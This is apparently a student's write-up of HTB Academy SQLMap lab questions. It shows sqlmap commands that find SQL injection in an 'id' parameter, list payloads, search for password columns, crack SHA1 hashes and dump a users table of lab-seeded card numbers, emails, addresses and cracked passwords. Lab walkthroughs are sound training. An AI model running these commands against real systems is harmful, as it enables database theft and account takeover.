# Section 08: Advanced Database Emuneration

Module: 18. SQLMap Essentials

---

## Questions & Answers

### 1. What's the name of the column containing "style" in it's name? (Case #1)

Context:
- Capture the request and exploit with SQLMap:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-hw8teyjkz7-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req1.txt --search -C style --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:11:41 /2026-09-09/

[09:11:41] [INFO] parsing HTTP request from 'req1.txt'
[09:11:41] [INFO] testing connection to the target URL
[09:11:42] [INFO] testing if the target URL content is stable
[09:11:42] [INFO] target URL content is stable
[09:11:42] [INFO] testing if GET parameter 'id' is dynamic
[09:11:42] [INFO] GET parameter 'id' appears to be dynamic
[09:11:42] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[09:11:43] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[09:11:43] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[09:11:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:11:43] [WARNING] reflective value(s) found and filtering out
[09:11:43] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="1958")
[09:11:43] [INFO] testing 'Generic inline queries'
[09:11:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:11:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:11:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:11:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:11:45] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[09:11:45] [WARNING] potential permission problems detected ('command denied')
[09:11:45] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[09:11:45] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:11:45] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:11:46] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:11:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[09:11:46] [INFO] testing 'MySQL inline queries'
[09:11:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:11:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
[09:12:00] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[09:12:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:12:10] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[09:12:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:12:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:12:11] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:12:12] [INFO] target URL appears to have 6 columns in query
[09:12:13] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 43 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8558=8558

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5347 FROM(SELECT COUNT(*),CONCAT(0x7178707071,(SELECT (ELT(5347=5347,1))),0x716a626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5045 FROM (SELECT(SLEEP(5)))udlB)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7178707071,0x4f6c557650724d754c486d5a597777525755454a6e73457876786f49544f6776527247725a6c6852,0x716a626a71),NULL,NULL,NULL,NULL-- -
---
[09:12:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
do you want sqlmap to consider provided column(s):
[1] as LIKE column names (default)
[2] as exact column names
> 1
[09:12:13] [INFO] searching columns LIKE 'style' across all databases
[09:12:13] [INFO] fetching columns LIKE 'style' for table 'ROUTINES' in database 'information_schema'
columns LIKE 'style' were found in the following databases:
Database: information_schema
Table: ROUTINES
[1 column]
+-----------------+------------+
| Column          | Type       |
+-----------------+------------+
| PARAMETER_STYLE | varchar(8) |
+-----------------+------------+

do you want to dump found column(s) entries? [Y/n] Y
which database(s)?
[a]ll (default)
[information_schema]
[q]uit
> a
which table(s) of database 'information_schema'?
[a]ll (default)
[ROUTINES]
[s]kip
[q]uit
> a
[09:12:14] [INFO] fetching entries of column(s) 'PARAMETER_STYLE' for table 'ROUTINES' in database 'information_schema'
[09:12:15] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[09:12:15] [WARNING] the SQL query provided does not return any output
[09:12:17] [INFO] fetching number of column(s) 'PARAMETER_STYLE' entries for table 'ROUTINES' in database 'information_schema'
[09:12:17] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[09:12:17] [INFO] retrieved: 0
[09:12:18] [WARNING] table 'ROUTINES' in database 'information_schema' appears to be empty
[09:12:18] [WARNING] unable to retrieve the entries of columns 'PARAMETER_STYLE' for table 'ROUTINES' in database 'information_schema' (permission denied)
[09:12:18] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[09:12:18] [WARNING] your sqlmap version is outdated

[*] ending @ 09:12:18 /2026-09-09/
```

**Answer:** `PARAMETER_STYLE`

---

### 2. What's the Kimberly user's password? (Case #1)

Context:
- Exploit with SQLMap:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-hw8teyjkz7-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req1.txt --search -C pass --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:14:41 /2026-09-09/

[09:14:41] [INFO] parsing HTTP request from 'req1.txt'
[09:14:41] [INFO] resuming back-end DBMS 'mysql' 
[09:14:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8558=8558

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5347 FROM(SELECT COUNT(*),CONCAT(0x7178707071,(SELECT (ELT(5347=5347,1))),0x716a626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5045 FROM (SELECT(SLEEP(5)))udlB)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7178707071,0x4f6c557650724d754c486d5a597777525755454a6e73457876786f49544f6776527247725a6c6852,0x716a626a71),NULL,NULL,NULL,NULL-- -
---
[09:14:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
do you want sqlmap to consider provided column(s):
[1] as LIKE column names (default)
[2] as exact column names
> 1
[09:14:41] [INFO] searching columns LIKE 'pass' across all databases
[09:14:41] [WARNING] potential permission problems detected ('command denied')
[09:14:42] [INFO] fetching columns LIKE 'pass' for table 'users' in database 'testdb'
columns LIKE 'pass' were found in the following databases:
Database: testdb
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

do you want to dump found column(s) entries? [Y/n] Y
which database(s)?
[a]ll (default)
[testdb]
[q]uit
> a
which table(s) of database 'testdb'?
[a]ll (default)
[users]
[s]kip
[q]uit
> a
[09:14:42] [INFO] fetching entries of column(s) 'password' for table 'users' in database 'testdb'
[09:14:42] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[09:14:42] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[09:14:42] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[09:14:42] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[09:14:42] [INFO] starting 4 processes 
[09:14:43] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                                                                            
[09:14:43] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                                                                            
[09:14:43] [INFO] cracked password '1955chev' for hash 'aed6d83bab8d9234a97f18432cd9a85341527297'                                                                                            
[09:14:43] [INFO] cracked password '3052' for hash '9a0f092c8d52eaf3ea423cef8485702ba2b3deb9'                                                                                                
[09:14:43] [INFO] cracked password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'                                                                                         
[09:14:43] [INFO] cracked password 'actionteam' for hash '520df62660b18e571c7cb3b5d3f559b8a8ff0d4b'                                                                                          
[09:14:43] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'
[09:14:43] [INFO] cracked password 'aza221p' for hash '6725c7bee76ccdb7eda15fa263908988115498a9'                                                                                             
[09:14:43] [INFO] cracked password 'breakout' for hash 'ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74'                                                                                            
[09:14:44] [INFO] cracked password 'donatus' for hash '20021ffbd3be7a3cddc64812d5dd6e5afb6e760c'                                                                                             
[09:14:44] [INFO] cracked password 'exquisite' for hash 'c7fbcdaf308cdcd64504d46342e7c79959388c44'                                                                                           
[09:14:44] [INFO] cracked password 'hjungpil1' for hash '4282cfe7697817374251bc17aa47de6f620586b5'                                                                                           
[09:14:44] [INFO] cracked password 'homerhound' for hash 'c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b'                                                                                          
[09:14:44] [INFO] cracked password 'hibiskus' for hash 'a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295'                                                                                            
[09:14:44] [INFO] cracked password 'melek200215' for hash '5635e59941510dc473fbeed046c43007f76cfe03'                                                                                         
[09:14:44] [INFO] cracked password 'millisa34' for hash '608e6d07cc8ce20bfdaf9c72ef420ad691de32cb'                                                                                           
[09:14:44] [INFO] cracked password 'morswin2' for hash '8203b1bf12aba49d7566ff7007b60d1c0a439bee'                                                                                            
[09:14:45] [INFO] cracked password 'ford1900' for hash 'f2d897eb3bae0f1fd396325deb3c4779ae1d586d'                                                                                            
[09:14:45] [INFO] cracked password 'plasid' for hash '15ce1871a907e8265f00defa21a723e7a4d35267'                                                                                              
[09:14:45] [INFO] cracked password 'mike230040' for hash '65b136cb1ec4b88f709f8f510262720eddfa71a7'                                                                                          
[09:14:45] [INFO] cracked password 'raided' for hash '2b89b43b038182f67a8b960611d73e839002fbd9'                                                                                              
[09:14:45] [INFO] cracked password 'nike92' for hash '2e0488a09433aa0d67b3463c76f407c7b0388ad7'                                                                                              
[09:14:45] [INFO] cracked password 'sgreen4eva' for hash '41244ab550c182b3ebe2dce87065bf363d0e013e'                                                                                          
[09:14:45] [INFO] cracked password 'spiderpig8574376' for hash 'b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e'                                                                                    
[09:14:45] [INFO] cracked password 'ssival47' for hash 'f5eb0fbdd88524f45c7c67d240a191163a27184b'                                                                                            
[09:14:45] [INFO] cracked password 'sk8ter58' for hash '3d8f48ab8e119dd813a449f6bfcf42abae63567b'                                                                                            
[09:14:45] [INFO] cracked password 'rohaniah' for hash '4bf1926f7bb7ae283e1390236fd4a8737209862e'                                                                                            
[09:14:45] [INFO] cracked password 'vptwo0gc' for hash '21549a28300f72442b132d06d4016de606f36627'                                                                                            
[09:14:45] [INFO] cracked password 'tarablinda' for hash '9987f0c165bc62eb3ee3db17967fbb81c026c197'                                                                                          
Database: testdb                                                                                                                                                                             
Table: users
[32 entries]
+-------------------------------------------------------------+
| password                                                    |
+-------------------------------------------------------------+
| 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             |
| 10946aa229a6d569f226976b22ea0e900a1fc219                    |
| a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         |
| b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) |
| aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         |
| d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      |
| 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           |
| f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         |
| 9987f0c165bc62eb3ee3db17967fbb81c026c197 (tarablinda)       |
| c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b (homerhound)       |
| 608e6d07cc8ce20bfdaf9c72ef420ad691de32cb (millisa34)        |
| 8203b1bf12aba49d7566ff7007b60d1c0a439bee (morswin2)         |
| ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74 (breakout)         |
| 520df62660b18e571c7cb3b5d3f559b8a8ff0d4b (actionteam)       |
| 2e0488a09433aa0d67b3463c76f407c7b0388ad7 (nike92)           |
| 21549a28300f72442b132d06d4016de606f36627 (vptwo0gc)         |
| 0ff476c2676a2e5f172fe568110552f2e910c917 (Zc1uowqg6)        |
| 15ce1871a907e8265f00defa21a723e7a4d35267 (plasid)           |
| df692aa944eb45737f0b3b3ef906f8372a3834e9 (1201Hunt)         |
| 20021ffbd3be7a3cddc64812d5dd6e5afb6e760c (donatus)          |
| 3d8f48ab8e119dd813a449f6bfcf42abae63567b (sk8ter58)         |
| 41244ab550c182b3ebe2dce87065bf363d0e013e (sgreen4eva)       |
| 5635e59941510dc473fbeed046c43007f76cfe03 (melek200215)      |
| 09422b94c8f031285b22500c2d0a68bb8ec4dc70                    |
| 65b136cb1ec4b88f709f8f510262720eddfa71a7 (mike230040)       |
| 4282cfe7697817374251bc17aa47de6f620586b5 (hjungpil1)        |
| f2d897eb3bae0f1fd396325deb3c4779ae1d586d (ford1900)         |
| 4bf1926f7bb7ae283e1390236fd4a8737209862e (rohaniah)         |
| c7fbcdaf308cdcd64504d46342e7c79959388c44 (exquisite)        |
| 6725c7bee76ccdb7eda15fa263908988115498a9 (aza221p)          |
| 70f361f8a1c9035a1d972a209ec5e8b726d1055e (05adrian)         |
| c6970ba1130b4bbca5be99f0ce00a706f256c818                    |
+-------------------------------------------------------------+

[09:14:47] [INFO] table 'testdb.users' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/users.csv'
[09:14:47] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[09:14:47] [WARNING] your sqlmap version is outdated

[*] ending @ 09:14:47 /2026-09-09/

┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-hw8teyjkz7-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req1.txt --dump -D testdb -T users --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:15:38 /2026-09-09/

[09:15:38] [INFO] parsing HTTP request from 'req1.txt'
[09:15:38] [INFO] resuming back-end DBMS 'mysql' 
[09:15:38] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8558=8558

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5347 FROM(SELECT COUNT(*),CONCAT(0x7178707071,(SELECT (ELT(5347=5347,1))),0x716a626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5045 FROM (SELECT(SLEEP(5)))udlB)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7178707071,0x4f6c557650724d754c486d5a597777525755454a6e73457876786f49544f6776527247725a6c6852,0x716a626a71),NULL,NULL,NULL,NULL-- -
---
[09:15:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[09:15:39] [INFO] fetching columns for table 'users' in database 'testdb'
[09:15:39] [WARNING] potential permission problems detected ('command denied')
[09:15:39] [INFO] fetching entries for table 'users' in database 'testdb'
[09:15:39] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[09:15:39] [INFO] using hash method 'sha1_generic_passwd'
[09:15:39] [INFO] resuming password '3052' for hash '9a0f092c8d52eaf3ea423cef8485702ba2b3deb9'
[09:15:39] [INFO] resuming password 'hibiskus' for hash 'a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295'
[09:15:39] [INFO] resuming password 'spiderpig8574376' for hash 'b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e'
[09:15:39] [INFO] resuming password '1955chev' for hash 'aed6d83bab8d9234a97f18432cd9a85341527297'
[09:15:39] [INFO] resuming password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'
[09:15:39] [INFO] resuming password 'raided' for hash '2b89b43b038182f67a8b960611d73e839002fbd9'
[09:15:39] [INFO] resuming password 'ssival47' for hash 'f5eb0fbdd88524f45c7c67d240a191163a27184b'
[09:15:39] [INFO] resuming password 'tarablinda' for hash '9987f0c165bc62eb3ee3db17967fbb81c026c197'
[09:15:39] [INFO] resuming password 'homerhound' for hash 'c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b'
[09:15:39] [INFO] resuming password 'millisa34' for hash '608e6d07cc8ce20bfdaf9c72ef420ad691de32cb'
[09:15:39] [INFO] resuming password 'morswin2' for hash '8203b1bf12aba49d7566ff7007b60d1c0a439bee'
[09:15:39] [INFO] resuming password 'breakout' for hash 'ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74'
[09:15:39] [INFO] resuming password 'actionteam' for hash '520df62660b18e571c7cb3b5d3f559b8a8ff0d4b'
[09:15:39] [INFO] resuming password 'nike92' for hash '2e0488a09433aa0d67b3463c76f407c7b0388ad7'
[09:15:39] [INFO] resuming password 'vptwo0gc' for hash '21549a28300f72442b132d06d4016de606f36627'
[09:15:39] [INFO] resuming password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'
[09:15:39] [INFO] resuming password 'plasid' for hash '15ce1871a907e8265f00defa21a723e7a4d35267'
[09:15:39] [INFO] resuming password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
[09:15:39] [INFO] resuming password 'donatus' for hash '20021ffbd3be7a3cddc64812d5dd6e5afb6e760c'
[09:15:39] [INFO] resuming password 'sk8ter58' for hash '3d8f48ab8e119dd813a449f6bfcf42abae63567b'
[09:15:39] [INFO] resuming password 'sgreen4eva' for hash '41244ab550c182b3ebe2dce87065bf363d0e013e'
[09:15:39] [INFO] resuming password 'melek200215' for hash '5635e59941510dc473fbeed046c43007f76cfe03'
[09:15:39] [INFO] resuming password 'mike230040' for hash '65b136cb1ec4b88f709f8f510262720eddfa71a7'
[09:15:39] [INFO] resuming password 'hjungpil1' for hash '4282cfe7697817374251bc17aa47de6f620586b5'
[09:15:39] [INFO] resuming password 'ford1900' for hash 'f2d897eb3bae0f1fd396325deb3c4779ae1d586d'
[09:15:39] [INFO] resuming password 'rohaniah' for hash '4bf1926f7bb7ae283e1390236fd4a8737209862e'
[09:15:39] [INFO] resuming password 'exquisite' for hash 'c7fbcdaf308cdcd64504d46342e7c79959388c44'
[09:15:39] [INFO] resuming password 'aza221p' for hash '6725c7bee76ccdb7eda15fa263908988115498a9'
[09:15:39] [INFO] resuming password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[09:15:39] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[09:15:39] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[09:15:39] [INFO] starting 4 processes 
Database: testdb                                                                                                                                                                             
Table: users
[32 entries]
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| id | cc               | email                       | phone        | name              | address                | birthday          | password                                                    | occupation                                        |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
| 1  | 5387278172507117 | MaynardMRice@yahoo.com      | 281-559-0172 | Maynard Rice      | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |
| 2  | 4539475107874477 | JulioWThomas@gmail.com      | 973-426-5961 | Julio Thomas      | 1207 Granville Lane    | February 14 1972  | 10946aa229a6d569f226976b22ea0e900a1fc219                    | Agricultural product sorter                       |
| 3  | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | General and operations manager                    |
| 4  | 4929811432072262 | GregoryBStumbaugh@yahoo.com | 410-680-5653 | Gregory Stumbaugh | 1641 Marshall Street   | May 7 1936        | b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e (spiderpig8574376) | Foreign language interpreter                      |
| 5  | 4539646911423277 | BobbyJGranger@gmail.com     | 212-696-1812 | Bobby Granger     | 4510 Shinn Street      | December 22 1939  | aed6d83bab8d9234a97f18432cd9a85341527297 (1955chev)         | Medical records and health information technician |
| 6  | 5143241665092174 | KimberlyMWright@gmail.com   | 440-232-3739 | Kimberly Wright   | 3136 Ralph Drive       | June 18 1972      | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)      | Electrologist                                     |
| 7  | 5503989023993848 | DeanLHarper@yahoo.com       | 440-847-8376 | Dean Harper       | 3766 Flynn Street      | February 3 1974   | 2b89b43b038182f67a8b960611d73e839002fbd9 (raided)           | Store detective                                   |
| 8  | 4556586478396094 | GabrielaRWaite@msn.com      | 732-638-1529 | Gabriela Waite    | 2459 Webster Street    | December 24 1965  | f5eb0fbdd88524f45c7c67d240a191163a27184b (ssival47)         | Telephone station installer                       |
| 9  | 5452466713512742 | RoySCarr@msn.com            | 408-848-6272 | Roy Carr          | 1384 Sycamore Street   | October 19 1942   | 9987f0c165bc62eb3ee3db17967fbb81c026c197 (tarablinda)       | Freight, stock, and material mover                |
| 10 | 5231550277906388 | AlfonzoGWilliams@gmail.com  | 740-546-1581 | Alfonzo Williams  | 911 Irving Road        | July 16 1931      | c418f9859f9d85e9c7e1eadd8c512cf7ddf4d16b (homerhound)       | Outside order clerk                               |
| 11 | 5224197138746170 | ChristopherHBrown@yahoo.com | 917-840-2535 | Christopher Brown | 2246 Settlers Lane     | March 29 1951     | 608e6d07cc8ce20bfdaf9c72ef420ad691de32cb (millisa34)        | Unlicensed assistive personnel                    |
| 12 | 4485150912665782 | AudreyRHill@gmail.com       | 717-308-3644 | Audrey Hill       | 2306 Stout Street      | July 19 1969      | 8203b1bf12aba49d7566ff7007b60d1c0a439bee (morswin2)         | Mail processor                                    |
| 13 | 4716071391111521 | RyanMSpencer@msn.com        | 256-441-1530 | Ryan Spencer      | 4309 Turnpike Drive    | July 3 1979       | ef6896ab2d5a3c6e8ba7ee46ba3e48c29057ad74 (breakout)         | Claims representative                             |
| 14 | 4716242999773281 | JessieJSchwan@yahoo.com     | 989-217-2111 | Jessie Schwan     | 1285 Wood Street       | October 28 1937   | 520df62660b18e571c7cb3b5d3f559b8a8ff0d4b (actionteam)       | Network and computer systems administrator        |
| 15 | 5183997232057997 | ShannonRStewart@yahoo.com   | 828-850-2133 | Shannon Stewart   | 1596 Watson Lane       | May 28 1934       | 2e0488a09433aa0d67b3463c76f407c7b0388ad7 (nike92)           | Sketch artist                                     |
| 16 | 4556164708532886 | MarkLStilwell@msn.com       | 715-392-4649 | Mark Stilwell     | 121 Abner Road         | September 1 1950  | 21549a28300f72442b132d06d4016de606f36627 (vptwo0gc)         | Occupational therapist assistant                  |
| 17 | 4485731897297327 | AnnetteDGill@yahoo.com      | 216-376-3062 | Annette Gill      | 4999 Glenwood Avenue   | August 19 1977    | 0ff476c2676a2e5f172fe568110552f2e910c917 (Zc1uowqg6)        | Plate finisher                                    |
| 18 | 4485934311754598 | CyndiBReyes@gmail.com       | 903-679-2061 | Cyndi Reyes       | 4347 Hall Place        | June 5 1947       | 15ce1871a907e8265f00defa21a723e7a4d35267 (plasid)           | Executive                                         |
| 19 | 5217064909950341 | WilliamDMunoz@gmail.com     | 323-789-6686 | William Munoz     | 2961 Hillhaven Drive   | July 4 1928       | df692aa944eb45737f0b3b3ef906f8372a3834e9 (1201Hunt)         | Service station attendant                         |
| 20 | 4929461176669103 | ScottBPonce@yahoo.com       | 626-537-0602 | Scott Ponce       | 3023 Woodstock Drive   | September 19 1947 | 20021ffbd3be7a3cddc64812d5dd6e5afb6e760c (donatus)          | Benefits manager                                  |
| 21 | 4916977560623393 | PhilipTAhearn@gmail.com     | 509-327-6685 | Philip Ahearn     | 4418 Goodwin Avenue    | May 22 1938       | 3d8f48ab8e119dd813a449f6bfcf42abae63567b (sk8ter58)         | Office assistant                                  |
| 22 | 5480619405065199 | MyraJStephenson@yahoo.com   | 717-770-6897 | Myra Stephenson   | 4225 Aaron Smith Drive | December 25 1966  | 41244ab550c182b3ebe2dce87065bf363d0e013e (sgreen4eva)       | Animator                                          |
| 23 | 4532761682899246 | MarianCJoiner@yahoo.com     | 707-467-5061 | Marian Joiner     | 273 Fairway Drive      | February 12 1978  | 5635e59941510dc473fbeed046c43007f76cfe03 (melek200215)      | Foundry mold and coremaker                        |
| 24 | 5357620822740711 | LloydSLiu@gmail.com         | 616-396-4287 | Lloyd Liu         | 3277 Howard Street     | August 18 1951    | 09422b94c8f031285b22500c2d0a68bb8ec4dc70                    | Sound engineering technician                      |
| 25 | 5219707450752213 | JoshuaEFletcher@gmail.com   | 317-670-8864 | Joshua Fletcher   | 1510 Stewart Street    | August 14 1934    | 65b136cb1ec4b88f709f8f510262720eddfa71a7 (mike230040)       | Edition binding worker                            |
| 26 | 4485684355495794 | MargaretNBooker@msn.com     | 760-969-7147 | Margaret Booker   | 70 Wilson Street       | December 17 1975  | 4282cfe7697817374251bc17aa47de6f620586b5 (hjungpil1)        | Management information systems director           |
